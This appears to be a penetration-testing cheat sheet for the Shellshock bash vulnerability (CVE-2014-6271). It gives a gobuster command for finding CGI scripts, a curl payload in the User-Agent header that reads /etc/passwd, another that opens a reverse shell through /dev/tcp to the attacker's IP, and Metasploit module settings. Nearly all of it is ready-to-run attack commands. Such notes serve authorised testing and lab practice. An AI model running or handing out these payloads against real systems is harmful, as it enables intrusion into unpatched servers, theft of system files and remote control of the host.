## Shellshock (CVE-2014-6271)
- Find CGI Scripts `gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl`
- Vulnerability Confirmation `curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://<target>/cgi-bin/status.cgi`
- Trigger Reverse Shell `curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" http://<target>/cgi-bin/status.cgi`

#### msfconsole
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set TARGETURI /cgi-bin/status.cgi
set LHOST <your_ip>
exploit
```